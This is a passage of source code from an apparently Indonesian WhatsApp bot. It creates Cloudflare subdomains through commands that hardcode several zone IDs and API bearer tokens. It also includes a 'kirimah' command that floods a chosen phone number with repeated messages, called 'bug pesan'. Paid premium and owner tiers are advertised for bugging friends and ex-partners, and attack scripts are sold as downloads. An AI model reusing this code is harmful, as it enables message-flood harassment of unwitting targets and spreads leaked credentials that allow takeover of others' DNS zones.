           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain38': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Rafathar\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
            break
          case 'domain39': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain40': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864 id")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "UiM1CzcdcAYE_0wK1cv6nknLhR83lLywzzGQ5Q3r";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain41': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "433a5c33932fa9ae50165c9df5e15f0e";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "panel-zall.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain42': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "d4a6adffd3dd317753c4401e38cb7949";
               let apitoken = "oMSalNry5ByDu_PBJhTAxNOhQiYKjWQImKKDIhWh";
               let tld = "digital-market.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain43': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e13ba8568f6e44ca927569da961d9eb6";
               let apitoken = "bTF2B2fQNe0nJL62gTuGQEbeZCEbOC0FpGWB-ESr";
               let tld = "rafatharofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain44': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "fb96c7c37f24377704b78f5cc41af7a5";
               let apitoken = "XL-sfJZLBRtXDxkZ9ElUuxTLTwi95P-z-Ei14pDt";
               let tld = "tokodigital.software";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain45': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "03f3569e809aa63eb40d842af3ddb523";
               let apitoken = "kLS7qdEt9zuC9UJr2u5ok5LsPaKKk0p0vuuTgmEo";
               let tld = "panelprivv.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain46': {
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6285877276864")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "9b28f4ad0f06b36dd94cc56b01efc19a";
               let apitoken = "bMiZlOhkSzozUq1jMLO5bk4OeZr0GllyVtVWX1F4";
               let tld = "plerkuda.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By PediaBotz Official⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
     case 'delgc':
  if (!isOwner) return m.reply(`khusus Creator`)
    if (!isGroup) return m.reply(`Khusus Group`)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Sukses Menonaktifkan Fitur Domain Di Grup Ini Tuan✅`)
break
       case 'addgc':
    if (!isGroup) return m.reply(`Khusus Group`)         
if (!isOwner) return m.reply(`khusus Creator`)
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
m.reply(`${command} Sukses Mengaktifkan Fitur Domain Di Grup Ini Tuan✅`)
           break
        case 'kirimah': {
               if (!isPremium && !isOwner) return reply(mess.only.premium)
  if (!quoted) return m.reply('Format salah!!\nContoh: kirimah text,nomor,jumlah');
  
  let params = text.split(',');
  if (params.length < 3) return m.reply('Format salah!!\nContoh: kirim text,nomor,jumlah');

  let messageText = params[0];
  let targetNumber = params[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let messageCount = parseInt(params[2]);

  if (isNaN(messageCount) || messageCount < 1) return m.reply('Jumlah pesan harus berupa angka yang lebih besar dari 0.');

  const promises = [];
  for (let i = 0; i < messageCount; i++) {
    promises.push(
      DitzzXploit.sendMessage(targetNumber, {
        text: `*${messageText}*`,
        mentions: [sender]
      }, {
        quoted: lep
      })
    );
  }

  Promise.all(promises)
    .then(() => {
      m.reply(`Berhasil mengirim ${messageCount} bug pesan!`);
    })
    .catch(() => {
      m.reply('Gagal mengirim pesan!');
    });

  break;
}
        case 'done':{
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal`);
let barang = t[0];
let nominal = t[1];
reply(`*━━ TRANSAKSI INFO ━━*

 _• *Barang:* ${barang}_
 _• *Nominal:* ${nominal}_
 _• *Tanggal:* Rp${tanggal}_

*TERIMA KASIH TELAH ORDER DI ${global.namaCreator}*\n*JANGAN LUPA ORDER LAGI YA*🙏`)
}
        break
case "tunda": {
const owned = `6285877276864@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚* )▭▬▭


𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗣𝗘𝗡𝗗𝗜𝗡𝗚
𝗛𝗔𝗥𝗔𝗣 𝗕𝗘𝗥𝗦𝗔𝗕𝗔𝗥

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "proses": {
const owned = `6285877276864@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗦𝗘𝗗𝗔𝗡𝗚 𝗗𝗜 𝗣𝗥𝗢𝗦𝗘𝗦* )▭▬▭


𝗛𝗮𝗿𝗮𝗽 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗯𝗲𝗻𝘁𝗮𝗿
𝗣𝗿𝗼𝗱𝘂𝗸 𝗦𝗲𝗱𝗮𝗻𝗴 𝗗𝗶 𝗣𝗿𝗼𝘀𝗲𝘀️

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "batal": {
const owned = `6285877276864@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗔𝗧𝗔𝗟* )▭▬▭

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${tanggal}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${jam}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

𝗦𝗲𝗹𝘂𝗿𝘂𝗵 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqvps": {
const owned = `6285877276864@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST VPS* )▭▬▭

Region : 
Os : 
Version : 
Ram : 
Ip : 
Password : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "reqpanel": {
const owned = `6285877276864@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *REQUEST PANEL* )▭▬▭

Ram : 
Username :
Nomor Wa : 
*Garansi 15 Day*
*Create ${tanggal}*
*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
        //Bagian Otomatis Menu
        case "buyowner":
if (cekSaldo(sender,db_saldo) < 20000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await DitzzXploit.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknbos.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Selamat Kepada ${pushname} dengan nomor ${bnnd} telah premium 

Keuntungan Owner👇🏻
-Muncul dalam daftar Owner
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
        minSaldo(sender, 20000, db_saldo)
break
        case "buyprem":{
if (cekSaldo(sender,db_saldo) < 10000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await DitzzXploit.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Selamat Kepada ${pushname} dengan nomor ${prrkek} telah premium 

Keuntungan Premium👇🏻
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
}
   minSaldo(sender, 10000, db_saldo)     
break
        case 'minsaldo':
if (!isOwner) m.reply(`Mau Ngapain Yatim?`) 
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
                case 'buyscpanel': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('https://www.mediafire.com/file/g26mwz05enfd02p/Sc+Cpanel.zip/file')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv1': {
       if (cekSaldo(sender,db_saldo) < 15000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 15000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv2': {
       if (cekSaldo(sender,db_saldo) < 25000) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp25.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
reply(`Wait Tuan Sc Sedang Kami Proses⏳`) 
                    minSaldo(sender, 25000, db_saldo)
const baby2 = await mediafireDl('-')
DitzzXploit.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'buyscbugv3': {
